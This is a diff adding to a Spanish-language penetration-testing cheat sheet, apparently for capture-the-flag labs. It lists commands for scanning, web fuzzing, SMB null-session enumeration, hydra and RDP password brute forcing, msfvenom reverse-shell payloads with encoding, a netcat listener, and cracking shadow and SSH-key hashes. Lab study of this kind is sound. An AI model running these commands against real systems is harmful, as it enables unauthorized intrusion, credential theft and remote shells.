@@ -1,29 +1,76 @@
+TRANSFERENCIA DE ARCHIVOS  
+..........................
+
+sudo python -m http.server 80
+sudo python -m SimpleHTTPServer 80
+
+TRATAMIENTO TTY
+...............
+
+LINUX
+
+   ------ option 1 -------
+   script /dev/null -c bash
+   ctrl+z
+   stty raw-echo
+   fg
+   reset
+   xterm
+   export TERM=xterm
+   export SHELL=bash
+   stty rows 52 columns 180
+
+   ------ option 2 -------
+   script /dev/null -c bash
+   ctrl+z
+   stty raw-echo
+   fg
+   reset
+   xterm
+   export TERM=xterm
+   export SHELL=bash
+   stty rows 52 columns 180
+
+   ------ option 3 -------
+   python3 -c 'import pty; pty.spawn("/bin/bash")'
+   export TERM=screen-256color
+   [Ctrl + z]
+   echo $TERM
+   stty raw -echo
+   fg
+   [INTRO]
+
 ENUMERACION
 ...........
 
       DESCUBRIMIENTO DE HOSTS
       .......................
-         fping -a -g {Rango de IP}
+            
+            arp-scan -I [interfaz] [rango IP] -g --> más recomendado!
+
+            fping -a -g {Rango de IP}
                   -a: Este argumento indica que muestre solamente las ips que están activas en la red.
                   -g: Este argumento especifica que vamos a hacer el ping a un rango de ip.
          
-         nmap -sn {Rango de IP}
+            nmap -sn {Rango de IP}
                   -sn Este argumento indica a nmap que realice un escaneo de ping al rango de ip indicado.
 
-         netdiscover -r {Rango de IP}
+            netdiscover -r {Rango de IP}
                   -r Este argumento indica que se va escanear un rango de ip.
+
+            
 
      DESCUBRIMIENTO DE PUERTOS
      .........................
 
-         sudo nmap -sS --min-rate 5000 -p- --open {IPs ej: 10.0.2.43,45,46...} -oN tcp_scan.txt
+            sudo nmap -sS --min-rate 5000 -p- --open {IPs ej: 10.0.2.43,45,46...} -oN tcp_scan.txt
                    -sS Este argumento hace un escaneo SYN (no completa la conexion)
                    --min-rate Este argumento acelera el escaneo
                    -p- Este argumento escanea todos los puertos  
                    --open Este argumento muestra solo puertos abiertos
                    -oN Este argumento es para darle salida al escaneo en un archivo
 
-         nmap -p22,80,443,445,... -sC -sV --open {IPs ej: 10.0.2.43,45,46...} -Pn -oN full_scan.txt
+            nmap -p22,80,443,445,... -sC -sV --open {IPs ej: 10.0.2.43,45,46...} -Pn -oN full_scan.txt
                    -sC: Indica que utilice unos scripts básicos de reconocimiento contra la IP.
                    -sV: Indica que muestre la versión que está funcionando en los puertos encontrados.
                    -Pn Indica que ignore la detección de host. Es útil cuando el host está filtrando o bloqueando el trafico ICMP. 
@@ -31,22 +78,189 @@ ENUMERACION
       ENUMERACION WEB
       ...............
 
-          crtl+u => ver codigo fuente de la web
+            crtl+u => ver codigo fuente de la web
          
-          sudo nano /etc/hosts => si la web no carga bien añadir referencia DNS ej: 10.10.10.10      blog.thm
+            sudo nano /etc/hosts => si la web no carga bien añadir referencia DNS ej: 10.10.10.10      blog.thm
+
+            DNS
+               dig axfr [dominio]
+               nslookup
+
+           whatweb -v http://url.com
+
+            sslscan <ip> => permitirá anilizar el protocolo SSL/TLS que tiene configurado
+
+            openssl s_client -connect [dominio]:443 --> ver certificados SSL
+
+            wfuzz -c -t 400 --hc=404 -w [wordlist] [url]/FUZZ
+            wfuzz -c -t 400 --hc=404 -w [wordlist] -w [archivo_extensiones] [url]/FUZZ.FUZ2Z
+            wfuzz -c -t 400 --hc=404 -z range,0-100 http://IP/note.php?note=FUZZ --> probar numeros del 0 al 100
+
+            ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://<RHOST>/admin../admin_staging/index.php?page=FUZZ -fs 15349 --> Searching for LFI
+            ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/signup -mr "username already exists" --> Username enumeration with ffuf
+            ffuf -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "host:FUZZ.empline.thm" -u 'http://empline.thm/' -fs 14058 --> escaneo de subdominios
+
+            dirb http://IP /path/to/wordlist
+
+            dirsearch -u http://[IP]/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 150 -e php,txt,html -f
+            dirb http://[IP]/ -u user:password => Si para acceder al sitio web salta un cuadro emergente pidiendo credenciales y las conocemos, para fuzzear esa parte a la que accedemos despues del login:
+
+            DIRBUSTER
+                  1 - Poner target: http://10.10.10.10
+                  2 - Poner Diccionario: /usr/share/wordlists/dirbuster/directory-list/lowercase-2-3-medium.txt
+
+            gobuster dir -u "ip" -w /usr/share/wordlist/rockyou.txt -t 30
+                  -u: Este argumento indica la IP/URL a analizar.
+                  -w: Este argumento indica el directorio donde se encuentra el diccionario.
+                  -t: Este argumento indica los hilos a los que se va a hacer el descubrimiento. Mientras más hilos, más ruido creas en la red y menos preciso es el escaneo
+            gobuster -u "ip" -w /usr/share/wordlist/rockyou.txt -t 30 -x .txt,.php.js
+                  -x: Este argumento indica las extensiones que se quieren analizar.
+
+            wpscan --url http://web.com/carpeta => escaneo de web "wordpress" con plugins incluidos y versiones  
+
+            joomscan -u [URL]
+            https://github.com/SamJoan/droopescan
+
+            magescan.phar scan:all [URL]
+            https://github.com/steverobbins/magescan
+
+            zaaproxy
+
+            burpsuite  
+
 
       PUERTO 80
       .........
 
-        1 - Revisa toda la página y el código fuente.
-        2 - Lee cada página, revisa posibles emails, usuarios, información, etc.
-        3 - Una vez encontrada la versión del sistema, busca en Google información acerca del servicio, busca exploits, CVEs, cualquier información que te permita determinar si la versión es vulnerable.
-        4 - Utiliza whatweb o Wappalyzer para encontrar información sobre la aplicación web.
-        5 - Realiza descubrimiento de directorios y de archivos.
+            1 - Revisa toda la página y el código fuente.
+            2 - Lee cada página, revisa posibles emails, usuarios, información, etc.
+            3 - Una vez encontrada la versión del sistema, busca en Google información acerca del servicio, busca exploits, CVEs, cualquier información que te permita determinar si la versión es vulnerable.
+            4 - Utiliza whatweb o Wappalyzer para encontrar información sobre la aplicación web.
+            5 - Realiza descubrimiento de directorios y de archivos.
 
+      BUSCAR VULNERABILIDADES
+      .......................
 
+            nikto --url http://web.com => Para vulenerabilidades WEB
+            nikto -h scanme.nmap.org
+            nikto -h https://nmap.org -ssl --> Si la web va por HTTPS
+            nikto -h $TARGET -T 9 -Format txt -o scans/$TARGET-nikto-80-sqli --> Escanea en busca de vulnerabilidades SQLi
 
+            nmap --script=servicio -p"Puerto" <IP> => Ej: nmap --script=ftp -p21 10.10.10.10
 
+EXPLOTACION
+...........
+
+      PUERTO 445/SMB
+      ..............
+
+            LISTAR RECURSOS COMPARTIDOS
+            ...........................
+
+                  smbclient -L 10.10.10.10 -N
+                        -L: Mostrar por consola los recursos compartidos.
+                        -N: Nullsession
+                  Para conectarse:
+                        smbclient //IP/RECURSO -n                  
+                        smbclient //10.10.10.10/directorio -U user => Acceso a carpeta si tenemos usuario y contraseña
+                  Una vez dentro para descargar:
+                        smb:\> => get: descarga un documento / mget: descarga todos los documentos
+                        smbget -R smb://IP/recurso
+                        prompt off
+
+                  enum4linux 10.10.10.10 
+                  enum4linux -a <IP address>
+
+                  smbmap -H 10.10.10.10 => Enumerar carpetas Nullsession
+                  smbmap -H 10.10.10.10 -u user -p password => Acceder carpetas si tenemos usuario y contraseña
+
+                  crackmapexec smb 10.10.10.10 -u ' ' -p ' ' --shares => buscamos carpetas de nullsession
+                        dejamos 1 espacio entre comillas simples para nullsession
+                        -u: Usuario
+                        -p: Password 
+                  crackmapexec smb 10.10.10.10 -u 'user' -p 'password.txt' => ataque de diccionario a un usuario determinado
+
+      FUERZA BRUTA WEB
+      ................
+
+            wpscan -U admin -P /usr/share/wordlist/rockyou.txt --url http://web.com/carpeta => ataque de diccionario al panel de login de wordpress
+
+            hydra –l <user> -P <diccionario> <IP> <servicio>
+            hydra -L user.txt -P /usr/share/wordlists/rockyou.txt [IP] http-post-form "[URL]:[TOKEN-URL]:Login failed"
+                  Ejemplo: hydra -L /home/kali/Downloads/users.txt -P /usr/share/wordlists/rockyou.txt 'http-get-form://10.10.134.16/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=050toadub7n33f96ehi7jo83o1; security=low; security=low:F=Username and/or password incorrect' 
+                           hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: security=low; PHPSESSID=rt5o26sooph0v8p5nuarofj346"
+                  Ejemplo: hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 10.10.188.51 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:The password you entered for the username"
+                  Ejemplo: hydra -L users.txt -P /usr/share/wordlists/rockyou.txt [IP] http-post-form '/wordpress/wp-login.php:log=^USER^&pwd=^PASS^:S=302' --> Panel wordpress que no muestra error y redirecciona
+
+            
+
+      BUSCAR EXPLOIT
+      ..............
+
+            searchsploit wordpress mail masta 
+
+      ENCODEAR PAYLOAD
+      ................
+
+            www.revshells.com => para generar comandos msfvenom
+            msfvenom -p "payload" LHOST=10.10.10.10 LPORT=443 -f exe -o reverse.exe
+            msfvenom -p windows/meterpreter/reverse_tcp LHOST=(Your IP Address) LPORT=(Your Port) -e x86/shikata-ga-nai -f exe > encoded.exe
+
+      METASPLOIT
+      ..........
+
+            show => listar exploit, payload, auxiliary
+            search => buscar exploit, payload, vulnerabilidad, etc
+            use => seleccionar lo que queremos usar, ruta o numero
+            show info => mostrar informacion de lo seleccinado
+            set => configurar opcion
+            setg => configurar globalmente la opcion durante la session
+            run o exploit => activar el exploti o auxiliary
+
+      PONER MI PC EN ESCUCHA
+      ......................
+
+            nc -lvnp 443
+
+      CREAR DICCIONARIOS
+      ..................
+
+            crunch <min-len> <max-len> [<charset string>] [options]
+
+      CRACKEAR HASHES
+      ...............
+
+            https://hashes.com/en/decrypt/hash
+            https://hashcat.net/wiki/doku.php?id=example_hashes
+
+            ssh2john id_rsa > hashes.txt => Pasar un id_rsa a hash para crackear el hash
+
+            john --wordlist=/usr/share/wordlist/rockyou.txt hash.txt
+            sudo john --format=[format] --wordlist=[path to wordlist] [path to file]
+            john --list=formats => ver cifrados que admite john
+            Borrar logs john --> rm ~/.john/john.*
+
+            Si queremos juntar /etc/passwd y /etc/shadow para luego crackear...
+                 unshadow passwd.txt shadow.txt > unshadow.txt
+                 john unshadow.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+                  
+            hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
+                  -m => tipo de hash
+                  https://hashcat.net/wiki/doku.php?id=hashcat => flags de hashcat
+
+RDP
+...
+
+      xfreerdp /v:[IP] -sec-nla /u:"" -- Recon
+      xfreerdp /u:[USER] /p:[PASS] /v:[IP] /cert-ignore -- Para conectarse por RDP a un equipo
+      xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /dynamic-resolution +clipboard
+
+      rdesktop <RHOST>
+
+      ncrack -vv --user user -P wordlist.txt [IP]:3389 -- Try cracking rdp login
+
+      crowbar -b rdp -u user -C password_wordlist -s [IP] -v -- Other method to try cracking
 
 
 
